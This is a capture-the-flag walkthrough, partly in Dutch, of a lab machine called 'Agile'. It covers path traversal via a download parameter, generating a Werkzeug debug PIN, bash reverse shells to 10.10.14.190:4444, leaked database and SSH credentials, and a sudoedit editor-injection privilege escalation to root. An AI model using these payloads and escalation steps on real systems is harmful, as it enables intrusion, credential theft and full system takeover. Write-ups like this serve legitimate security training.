# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.228.212
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 13:08 CET
Nmap scan report for 10.129.228.212
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,80 -sCV 10.129.228.212 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-15 13:09 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Initiating Ping Scan at 13:09
Scanning 10.129.228.212 [4 ports]
Completed Ping Scan at 13:09, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:09
Completed Parallel DNS resolution of 1 host. at 13:09, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 13:09
Scanning 10.129.228.212 [2 ports]
Discovered open port 22/tcp on 10.129.228.212
Discovered open port 80/tcp on 10.129.228.212
Completed SYN Stealth Scan at 13:09, 0.06s elapsed (2 total ports)
Initiating Service scan at 13:09
Scanning 2 services on 10.129.228.212
Completed Service scan at 13:09, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.228.212.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 1.67s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.36s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Nmap scan report for 10.129.228.212
Host is up, received echo-reply ttl 63 (0.019s latency).
Scanned at 2025-03-15 13:09:08 CET for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCeVL2Hl8/LXWurlu46JyqOyvUHtAwTrz1EYdY5dXVi9BfpPwsPTf+zzflV+CGdflQRNFKPDS8RJuiXQa40xs9o=
|   256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEcaZPDjlx21ppN0y2dNT1Jb8aPZwfvugIeN6wdUH1cK
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Now i did go to the webpage "superpass.htb". There i saw a registration button, so i registered my self with the following credentials:

| Username | Password |
| -------- | -------- |
| test     | test     |
As you can see below am i logged in as the user test. 

![[Pasted image 20250315132856.png]]

there i can see a tab with the name vault. I did go to the vault page so i can see whats in the vault. As you can see below is there nothing inside the vault page.

![[Pasted image 20250315133035.png]]

So i am goiing to add some usernames and export them to my own machine so i can analyse the http requests. As you can see below did i make some new usernames and passwords and exported them.

![[Pasted image 20250315133525.png]]

I analysed the http request and as you can see are there 2 http request that were generated.

![[Pasted image 20250315133438.png]]

In the http download request can you see the parameter "**fn**" that will be vulnerable for directory path traversal.

![[Pasted image 20250315133735.png]]

Door het volgende in de webbrowser te gaan doen in de webbrowser ben ik in de http request gaan kijken heb ik het path gevonden waar dat we de app.py script zullen kunnen vinden. Als eerst ben ik de webbrowser de volgende url gaan invullen.

![[Pasted image 20250315134953.png]]

Eens dat ik dat gedaan had was ik gaan kijken in de http requests op burpsuite of dat er geen belangrijke informatie in zou staan. Daar ben ik het volgende path gaan vinden.

```
h4>File <cite class="filename">"/app/venv/lib/python3.10/site-packages/flask/app.py"</cite>
```

Als ik nu dus in de webbrowser het volgende zal gaan intypen kan je zien dat hij de app.py zal gaan downloaden. Dit doordat ik de path traversal gebruik dat vulnerable is voor deze website.

```
http://superpass.htb/download?fn=../app/venv/lib/python3.10/site-packages/flask/app.py
```

Nu dat ik dit dus kon doen, ben ik dus gaan doen door het /etc/passwd file te kunnen verkrijgen. Dit heb ik dus dan gedaan door het volgende commando uittevoeren.

```
http://superpass.htb/download?fn=../etc/passwd
```

Hierbij kom ik dus 2 interessante namen te zien.

![[Pasted image 20250318205846.png]]

Ik ben nu dus door het path traversal te gaan doen, gaan kijken in de __init__.py file. Deze file kunnen we gaan vinden in het volgende path.

```
http://superpass.htb/download?fn=../app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py
```

Binnen deze file ben ik gaan zoeken naar welk hashing algorithm er gebruikt word. Als we in de init.py file gaan kijken die dat we zonet hebben kunnen downloaden kan je zien dat het hashing algorithm dat gebruikt wordt **sha1** is.

```
def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]
```

We hebben een rev shell die dat we op de volgende exploit page. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html.
Ik ben het script dat ik op de pagina heb gevonden aangepast naar de volgende code.

```
mport hashlib
from itertools import chain
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app>
    '/app/venv/lib/python3.10/site-packages/flask/app.p>
]

private_bits = [
    '345049956993',  # str(uuid.getnode()),  /sys/class>
    'ed5b159560f54721827644bc9b220d00superpass.service'>
]

# h = hashlib.md5()  # Changed in https://werkzeug.pall>
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(g>
                          for x in range(0, len(num), g>
            break
    else:
        rv = num

print(rv)
```

Als we daarna die rev.py gaan uitvoeren, zal je een code krijgen die dat je daarna zult kunnen gebruiken voor de console te openen.

```
python3 rev.py  
295-376-062
```

Als we nu dus naar de webpagina gaan dan, kan je 
binnen de console zal je de volgende code gaan uitvoeren waarmee dat als je een listener op zet, dan kan je connectie maken met de server.

```
import os; os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.190/4444 0>&1'")
```

Zoals je nu hieronder zult kunnen zien, heb ik de connectie kunnen maken met de server.

```
nc -lnvp 4444

listening on [any] 4444 ...
id
connect to [10.10.14.190] from (UNKNOWN) [10.129.228.212] 36510
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
(venv) www-data@agile:/app/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(venv) www-data@agile:/app/app$
```

Ik ben dan een beetje gaan rondkijken binnen in de server en ik ben op de file "config_prod.json" gekomen waarin er een mysql user staat.

```
www-data@agile:/app/app/superpass$ cat /app/config_prod.json   
cat /app/config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}(venv)
```

Ik zal dus nu aan de hand van deze gegevens gaan inloggen op de mysql server zodat ik misschien het password van 1 van de user kan vinden. Ik ben gaan inloggen op de mysql server met de volgende credentials:

```
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass
```

Nu kan je aan de foto van hieronder zien hoe dat ik de password van corum heb gevonden.

![[Pasted image 20250320194845.png]]

Nu ben ik gaan inloggen op de ssh server.

```
ssh corum@superpass.htb    
The authenticity of host 'superpass.htb (10.129.228.212)' can't be established.
ED25519 key fingerprint is SHA256:kxY+4fRgoCr8yE48B5Lb02EqxyyUN9uk6i/ZIH4H1pc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'superpass.htb' (ED25519) to the list of known hosts.
corum@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Wed Mar  8 15:25:35 2023 from 10.10.14.47
corum@agile:~$ 
```

user flag = fac52b58e855d3cb266c921ed12e14e1

```
corum@agile:~$ cat user.txt 
fac52b58e855d3cb266c921ed12e14e1
```

Nu dat ik op de ssh server ben ingeloged als de user corum, ben ik het netstat commando gaan uittvoeren.

```
corum@agile:~$ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:59416         localhost:41829         ESTABLISHED
tcp        0      0 localhost:41829         localhost:59416         ESTABLISHED
tcp        0      0 localhost:43806         localhost:5000          ESTABLISHED
tcp      150      0 localhost:43470         localhost:mysql         CLOSE_WAIT 
tcp        0      0 localhost:41829         localhost:59402         ESTABLISHED
tcp        0      0 localhost:59402         localhost:41829         ESTABLISHED
tcp        0      0 localhost:56171         localhost:43290         ESTABLISHED
tcp        0      0 10.129.228.212:55268    10.10.14.190:4444       ESTABLISHED
tcp        0      0 localhost:5000          localhost:43806         ESTABLISHED
tcp        0      1 10.129.228.212:44802    8.8.8.8:domain          SYN_SENT   
tcp        0      0 localhost:43290         localhost:56171         ESTABLISHED
tcp        0    216 10.129.228.212:ssh      10.10.14.190:34860      ESTABLISHED
tcp        0      0 10.129.228.212:http     10.10.14.190:39780      ESTABLISHED
tcp      150      0 localhost:37630         localhost:mysql         CLOSE_WAIT 
udp        0      0 10.129.228.212:37352    8.8.8.8:domain          ESTABLISHED
udp        0      0 10.129.228.212:37466    1.1.1.1:domain          ESTABLISHED
udp        0      0 10.129.228.212:60096    1.1.1.1:domain          ESTABLISHED
udp        0      0 localhost:37599         localhost:domain        ESTABLISHED
udp        0      0 10.129.228.212:52038    8.8.8.8:domain          ESTABLISHED
udp        0      0 10.129.228.212:33671    8.8.8.8:domain          ESTABLISHED
udp        0      0 10.129.228.212:52645    1.1.1.1:domain          ESTABLISHED
udp        0      0 10.129.228.212:54964    1.1.1.1:domain          ESTABLISHED
udp        0      0 10.129.228.212:46942    8.8.8.8:domain          ESTABLISHED
udp        0      0 10.129.228.212:43197    8.8.8.8:domain          ESTABLISHED
udp        0      0 10.129.228.212:47458    1.1.1.1:domain          ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  10     [ ]         DGRAM      CONNECTED     29166    /run/systemd/journal/dev-log
unix  9      [ ]         DGRAM      CONNECTED     29168    /run/systemd/journal/socket
unix  2      [ ]         DGRAM                    58201    /run/user/1000/systemd/notify
unix  3      [ ]         SEQPACKET  CONNECTED     55888    @00035
unix  3      [ ]         SEQPACKET  CONNECTED     55893    @00037
unix  3      [ ]         SEQPACKET  CONNECTED     55889    @00036
unix  3      [ ]         SEQPACKET  CONNECTED     55895    @00038
unix  4      [ ]         DGRAM      CONNECTED     29142    /run/systemd/notify
unix  3      [ ]         STREAM     CONNECTED     55104    
unix  3      [ ]         STREAM     CONNECTED     31338    
unix  3      [ ]         STREAM     CONNECTED     55150    
unix  3      [ ]         STREAM     CONNECTED     55036    
unix  3      [ ]         SEQPACKET  CONNECTED     55896    
unix  3      [ ]         STREAM     CONNECTED     29439    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     32930    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM      CONNECTED     31705    
unix  3      [ ]         STREAM     CONNECTED     31770    
unix  3      [ ]         STREAM     CONNECTED     31316    
unix  2      [ ]         DGRAM      CONNECTED     33217    
unix  3      [ ]         STREAM     CONNECTED     32230    
unix  3      [ ]         DGRAM      CONNECTED     29559    
unix  3      [ ]         STREAM     CONNECTED     56202    
unix  3      [ ]         STREAM     CONNECTED     56267    
unix  3      [ ]         DGRAM      CONNECTED     58202    
unix  3      [ ]         STREAM     CONNECTED     56220    
unix  3      [ ]         STREAM     CONNECTED     29374    
unix  3      [ ]         STREAM     CONNECTED     31720    
unix  2      [ ]         DGRAM      CONNECTED     31099    
unix  3      [ ]         STREAM     CONNECTED     31661    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     29610    
unix  2      [ ]         DGRAM      CONNECTED     58173    
unix  2      [ ]         DGRAM      CONNECTED     28215    
unix  3      [ ]         STREAM     CONNECTED     56253    
unix  3      [ ]         STREAM     CONNECTED     31659    
unix  3      [ ]         DGRAM      CONNECTED     29560    
unix  3      [ ]         STREAM     CONNECTED     31781    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     55105    
unix  3      [ ]         STREAM     CONNECTED     58206    
unix  3      [ ]         STREAM     CONNECTED     28122    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     29634    
unix  3      [ ]         STREAM     CONNECTED     56203    
unix  3      [ ]         STREAM     CONNECTED     56229    
unix  3      [ ]         STREAM     CONNECTED     55178    
unix  2      [ ]         STREAM     CONNECTED     57135    
unix  3      [ ]         STREAM     CONNECTED     57241    
unix  3      [ ]         DGRAM      CONNECTED     29416    
unix  3      [ ]         STREAM     CONNECTED     28146    
unix  3      [ ]         STREAM     CONNECTED     32146    
unix  3      [ ]         STREAM     CONNECTED     27996    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31944    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     54973    
unix  3      [ ]         STREAM     CONNECTED     56271    
unix  3      [ ]         STREAM     CONNECTED     58163    
unix  3      [ ]         STREAM     CONNECTED     28119    
unix  3      [ ]         STREAM     CONNECTED     29608    
unix  3      [ ]         STREAM     CONNECTED     31317    
unix  2      [ ]         DGRAM      CONNECTED     31239    
unix  2      [ ]         DGRAM      CONNECTED     32175    
unix  3      [ ]         STREAM     CONNECTED     29578    
unix  2      [ ]         DGRAM      CONNECTED     31658    
unix  2      [ ]         DGRAM      CONNECTED     27748    
unix  2      [ ]         DGRAM      CONNECTED     29358    
unix  3      [ ]         DGRAM      CONNECTED     28221    
unix  3      [ ]         STREAM     CONNECTED     32233    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     55103    
unix  2      [ ]         DGRAM      CONNECTED     32073    
unix  3      [ ]         STREAM     CONNECTED     55023    
unix  3      [ ]         DGRAM      CONNECTED     58203    
unix  3      [ ]         STREAM     CONNECTED     27873    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM      CONNECTED     28223    
unix  3      [ ]         SEQPACKET  CONNECTED     55891    
unix  3      [ ]         STREAM     CONNECTED     56268    
unix  3      [ ]         DGRAM      CONNECTED     29417    
unix  3      [ ]         STREAM     CONNECTED     33011    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31945    
unix  3      [ ]         STREAM     CONNECTED     31647    
unix  3      [ ]         STREAM     CONNECTED     31660    
unix  3      [ ]         STREAM     CONNECTED     55027    
unix  3      [ ]         STREAM     CONNECTED     55102    
unix  3      [ ]         STREAM     CONNECTED     28155    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     57240    
unix  3      [ ]         STREAM     CONNECTED     56206    
unix  2      [ ]         DGRAM      CONNECTED     29412    
unix  3      [ ]         DGRAM      CONNECTED     28220    
unix  3      [ ]         STREAM     CONNECTED     31785    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31946    
unix  3      [ ]         STREAM     CONNECTED     55172    
unix  3      [ ]         DGRAM      CONNECTED     29143    
unix  3      [ ]         STREAM     CONNECTED     28099    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     56207    
unix  3      [ ]         STREAM     CONNECTED     56264    
unix  3      [ ]         STREAM     CONNECTED     32070    
unix  3      [ ]         STREAM     CONNECTED     32259    
unix  3      [ ]         STREAM     CONNECTED     55024    
unix  3      [ ]         STREAM     CONNECTED     55177    
unix  3      [ ]         STREAM     CONNECTED     32145    
unix  3      [ ]         DGRAM      CONNECTED     29561    
unix  3      [ ]         STREAM     CONNECTED     55037    
unix  3      [ ]         STREAM     CONNECTED     55846    
unix  3      [ ]         STREAM     CONNECTED     57214    /run/dbus/system_bus_socket
unix  3      [ ]         SEQPACKET  CONNECTED     55890    
unix  3      [ ]         STREAM     CONNECTED     55026    
unix  3      [ ]         STREAM     CONNECTED     31630    
unix  3      [ ]         STREAM     CONNECTED     32143    
unix  3      [ ]         STREAM     CONNECTED     55038    
unix  3      [ ]         STREAM     CONNECTED     57197    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     27841    
unix  3      [ ]         STREAM     CONNECTED     55847    
unix  2      [ ]         DGRAM      CONNECTED     57175    
unix  3      [ ]         STREAM     CONNECTED     56270    
unix  3      [ ]         STREAM     CONNECTED     32812    
unix  3      [ ]         STREAM     CONNECTED     55020    
unix  3      [ ]         SEQPACKET  CONNECTED     55894    
unix  3      [ ]         STREAM     CONNECTED     29611    
unix  2      [ ]         STREAM     CONNECTED     58061    
unix  2      [ ]         DGRAM                    28191    
unix  3      [ ]         STREAM     CONNECTED     56204    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     31664    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     32144    
unix  3      [ ]         DGRAM      CONNECTED     29562    
unix  3      [ ]         STREAM     CONNECTED     31808    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     55021    
unix  3      [ ]         STREAM     CONNECTED     56265    
unix  2      [ ]         DGRAM      CONNECTED     58183    
unix  3      [ ]         DGRAM      CONNECTED     28222    
unix  3      [ ]         STREAM     CONNECTED     29607    
unix  3      [ ]         STREAM     CONNECTED     31340    
unix  2      [ ]         DGRAM      CONNECTED     29553    
unix  3      [ ]         STREAM     CONNECTED     31663    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     31721    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM      CONNECTED     29609    
unix  3      [ ]         STREAM     CONNECTED     28149    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     56252    
unix  3      [ ]         STREAM     CONNECTED     33140    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     29480    
unix  3      [ ]         DGRAM      CONNECTED     29144    
unix  3      [ ]         STREAM     CONNECTED     54974    
unix  3      [ ]         STREAM     CONNECTED     55173    
unix  3      [ ]         STREAM     CONNECTED     56219    
unix  3      [ ]         STREAM     CONNECTED     56230    
unix  3      [ ]         STREAM     CONNECTED     55149    
unix  2      [ ]         DGRAM      CONNECTED     29641    
unix  3      [ ]         STREAM     CONNECTED     31662    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     33008 
```

Ik ben linpeas gaan installeren op de ssh server, en via linpeas heb ik gezien dat er een webapplication aan het draaien is op poort 5555.

```
══════════╣ Hostname, hosts and DNS
agile                                                                                                                          
127.0.0.1 localhost superpass.htb test.superpass.htb
127.0.1.1 agile

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                              
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50547         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:50547               :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?

```

Voor naar de webpagina te kunnen gaan zullen we aan port forwarding moeten doen. Ik zal de port forwarding moeten gaan doen door het volgende commando en de volgende port te gebruiken.

```
ssh corum@superpass.htb -L 41829:127.0.0.1:41829
password 5db7caa1d13cc37c9fc2
```

Als ik dan nu in burpsuite in de chrome inspect de localhost zal gaan toevoegen dan komen we op de test page van superpass uit. Dus als eerst zal ik deze gaan toevoegen aan de chrome://inspect setting.
![[Pasted image 20250320182154.png]]

dan kunnen we bij de remote target inspect gaan clicken en dan komen we op de test.superpass.htb webpage uit.

![[Pasted image 20250320182247.png]]

Ik ben daar nu op de vault gaan clicken en binnen de vault heb ik het password van edwards gevonden. De credentials van de user edwards zal ik hieronder in een tabel zetten.

| Username | Password             |
| -------- | -------------------- |
| edwards  | d07867c6267dcb5df0af |
Zoals je hieronder nu kunt zien ben ik met die gegevens kunnen inloggen op de ssh server.

```
ssh edwards@superpass.htb
edwards@superpass.htb's password: 
Permission denied, please try again.
edwards@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Thu Mar  2 10:28:51 2023 from 10.10.14.23
edwards@agile:~$
```

Ik ben dus nu het commando sudo -l gaan uitvoeren voor het zien of dat ik niet code in de naam van de administrator zonder het password te moeten weten.

```
edwards@agile:~$ sudo -l
[sudo] password for edwards: 

Sorry, try again.
[sudo] password for edwards: 
Sorry, try again.
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

Ik kan dus zien door het commando van hierboven te gaan gebruiken zouden we in theorie de files kunnen bekijken. Ik ben eerst is gaan kijken wat welke versie sudo gebruikt.

```
edwards@agile:~$ sudo --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

Hierboven kan je zien dat de server sudo versie 1.9.9 gebruikt. Ik ben dus nu een exploit gaan zoeken voor de sudo met versie 1.9.9. 

Door de exploit te kijken ben ik aan de volgende code die dat ik ga kunnen uitvoeren met sudo rechten.

```
EDITOR="nano -- /app/venv/bin/activate" sudoedit -u dev_admin /app/config/_test.json
```

Binnen  deze file gaan we een rev shell commando gaan zetten zodat als we dit bestand gaan opslaan dat we de connectie met onze listener krijgen en dat ik dus connectie krijg met de root user. Hieronder zal ik het commando zetten dat ik heb gebruikt binnen de file.

```
# This should detect bash and zsh, which have a hash command that must
# be called to get it to forget past commands.  Without forgetting
# past commands the $PATH changes we made may not be respected
if [ -n "${BASH:-}" -o -n "${ZSH_VERSION:-}" ] ; then
    hash -r 2> /dev/null
fi
bash -i >& /dev/tcp/10.10.14.190/4444 0>&1
```

Bij de listener heb ik dus nu de connectie gekregen en ben ik dus de root user geworden.

root flag = cd524f2a685d5f538d94644ba1a82ac7

```
nc -lnvvp 4444

listening on [any] 4444 ...
connect to [10.10.14.190] from (UNKNOWN) [10.129.228.212] 38014
bash: cannot set terminal process group (5183): Inappropriate ioctl for device
bash: no job control in this shell
bash: connect: Connection refused
bash: /dev/tcp/10.10.14.190/4444: Connection refused
root@agile:~# ls
ls
app
clean.sh
root.txt
superpass.sql
testdb.sql
root@agile:~# cat root.txt
cat root.txt
cd524f2a685d5f538d94644ba1a82ac7
root@agile:~# 
```

![[Pasted image 20250320194543.png]]